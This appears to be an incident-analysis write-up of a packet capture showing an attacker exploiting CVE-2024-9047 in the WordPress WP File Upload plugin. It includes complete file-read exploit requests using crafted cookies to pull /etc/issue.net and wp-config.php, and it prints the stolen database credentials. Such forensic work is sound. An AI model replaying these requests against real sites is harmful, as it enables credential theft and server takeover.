# CVE-2024-9047 - (58.16.78.90 -> 192.168.100.101:80)

TCP flows confirm a potentially malicious action by an actor attempting to gather information about the **WP File Upload** plugin. The analyzed requests indicate a clear attempt at initial reconnaissance, followed by a targeted exploit aimed at exfiltrating sensitive files from the server.

## When

| **Event**                     | **Timestamp** | **TCP Stream** | **Details**                                   |
|--------------------------------|---------------|----------------|-----------------------------------------------|
| Information gathering          | 22:42:09:94   | 10             | GET /wp-content/plugins/wp-file-upload/       |
| First exploit                  | 22:43:34:29   | 193            | POST /wp-content/plugins/wp-file-upload/      |
| Second exploit                 | 22:43:43:57   | 215            | POST /wp-content/plugins/wp-file-upload/      |

## Who/Where

| **Role**         | **IP Address**         | **Port**        |
|-------------------|------------------------|-----------------|
| Attacker          | 58.16.78.90           | 34970,49736,46892 |
| Compromised server| 192.168.100.101       | 80 (srv-www)    |

## What

1. The attacker identified the presence of the **wp-file-upload** plugin and its version.

```sh
GET /wp-content/plugins/wp-file-upload/css/wordpress_file_upload_style.css?ver=6.8
GET /wp-content/plugins/wp-file-upload/css/wordpress_file_upload_adminbarstyle.css?ver=6.8
GET /wp-content/plugins/wp-file-upload/vendor/jquery/jquery-ui-timepicker-addon.min.js?ver=6.8
```

2. Exploit on OS information

```sh
POST /wp-content/plugins/wp-file-upload/wfu_file_downloader.php HTTP/1.1
Host: www.potenzio.com
User-Agent: python-requests/2.32.3
...
Cookie: wp_wpfileupload_testupload=Nxploited; 
wfu_storage_file123=/etc/issue.net; wfu_download_ticket_ticket123=9876543210987; wfu_ABSPATH=/
...
file=file123&ticket=ticket123&handler=dboption&session_legacy=1&dboption_base=cookies
&dboption_useold=0&wfu_cookie=wp_wpfileupload_testupload
```

3. Exploit on configuration information

```sh
POST /wp-content/plugins/wp-file-upload/wfu_file_downloader.php HTTP/1.1
Host: www.potenzio.com
User-Agent: python-requests/2.32.3
....
Cookie: wp_wpfileupload_testupload=Nxploited; 
wfu_storage_file123=/var/www/html/wp-config.php; 
wfu_download_ticket_ticket123=9876543210987; wfu_ABSPATH=/
....
file=file123&ticket=ticket123&handler=dboption&session_legacy=1&dboption_base=cookies
&dboption_useold=0&wfu_cookie=wp_wpfileupload_testupload
```

Exfiltrated content:

```php
// ** Database settings //

define( 'DB_NAME', 'wpdb' ); /** The name of the database for WordPress */
define( 'DB_USER', 'wp' ); /** Database username */
define( 'DB_PASSWORD', 'secret4wp' ); /** Database password */
define( 'DB_HOST', '10.0.100.100' ); /** Database hostname */
define( 'DB_CHARSET', 'utf8mb4' ); /** Database charset to use in creating database tables. */
define( 'DB_COLLATE', '' ); /** The database collate type. Don't change this if in doubt. */

/**
 * Authentication unique keys and salts.
 */
define( 'AUTH_KEY','*&xb-+qX)0]kRKF@-Y  Oig}y6f,QBVws)B:sDUA=yEJK.<;4eJ.Ay~g1EfrX-uI' );
...
```

## How

The attacker exploited the vulnerability [CVE-2024-9047](https://nvd.nist.gov/vuln/detail/cve-2024-9047) based on:

- HTTP request manipulation  

The client sent a POST request to wfu_file_downloader.php, simulating a legitimate download operation. 
However, it included malicious parameters such as `wfu_storage_file123=/var/www/html/wp-config.php`,
forcing the server to return the configuration file.

- Abuse of session cookies  

The client used special cookies `(wp_wpfileupload_testupload=Nxploited)` and a download ticket `(wfu_download_ticket_ticket123=9876543210987)`
to bypass the plugin's authorization checks and gain unauthorized access.

## Why

Exfiltration of WordPress database configuration files containing:

- Access credentials (username and password)
- Database connection information
- WordPress authentication keys and salts

**Wireshark filters used**

```bash
http.request.method == "POST" && http.request.uri contains "/wp-content/plugins/wp-file-upload/"
```